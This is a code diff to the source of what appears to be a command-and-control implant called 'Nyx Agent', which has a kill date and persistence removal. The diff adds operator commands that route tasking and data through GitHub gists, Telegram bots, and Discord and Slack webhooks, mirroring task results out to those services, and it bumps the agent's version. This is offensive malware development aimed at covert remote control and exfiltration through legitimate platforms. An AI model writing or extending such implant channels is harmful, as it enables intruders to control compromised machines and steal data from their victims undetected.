@@ -999,6 +999,66 @@ func dispatch(command string) (string, string) {
 		}
 		return out, "completed"
 
+	// ── Phase 8: External C2 Channels ──────────────────────────────────────────
+
+	case "extc2-github":
+		// usage: extc2-github <gist_id> <token> [poll_secs]
+		p := strings.SplitN(arg, " ", 3)
+		if len(p) < 2 {
+			return "usage: extc2-github <gist_id> <token> [poll_secs]", "failed"
+		}
+		poll := 30
+		if len(p) == 3 {
+			if v, err := strconv.Atoi(p[2]); err == nil {
+				poll = v
+			}
+		}
+		out, err := startExtC2(extC2Config{Type: ExtC2GitHub, GistID: p[0], GistToken: p[1], PollSecs: poll})
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "extc2-telegram":
+		// usage: extc2-telegram <bot_token> <chat_id> [poll_secs]
+		p := strings.SplitN(arg, " ", 3)
+		if len(p) < 2 {
+			return "usage: extc2-telegram <bot_token> <chat_id> [poll_secs]", "failed"
+		}
+		poll := 15
+		if len(p) == 3 {
+			if v, err := strconv.Atoi(p[2]); err == nil {
+				poll = v
+			}
+		}
+		out, err := startExtC2(extC2Config{Type: ExtC2Telegram, BotToken: p[0], ChatID: p[1], PollSecs: poll})
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "extc2-discord":
+		// usage: extc2-discord <webhook_url>
+		if arg == "" {
+			return "usage: extc2-discord <webhook_url>", "failed"
+		}
+		extC2DiscordMirror = strings.TrimSpace(arg)
+		return "[extc2] Discord webhook set — task results will be mirrored to Discord", "completed"
+
+	case "extc2-slack":
+		// usage: extc2-slack <webhook_url>
+		if arg == "" {
+			return "usage: extc2-slack <webhook_url>", "failed"
+		}
+		extC2SlackMirror = strings.TrimSpace(arg)
+		return "[extc2] Slack webhook set — task results will be mirrored to Slack", "completed"
+
+	case "extc2-stop":
+		return stopExtC2(), "completed"
+
+	case "extc2-status":
+		return extC2Status(), "completed"
+
 	case "kill":
 		fmt.Println("[!] Kill command received, exiting.")
 		os.Exit(0)
@@ -1147,7 +1207,7 @@ func removePersistence() string {
 }
 
 func main() {
-	fmt.Println("[*] Nyx Agent v1.2.0 starting...")
+	fmt.Println("[*] Nyx Agent v1.3.0 starting...")
 
 	// Kill date check
 	checkKillDate()
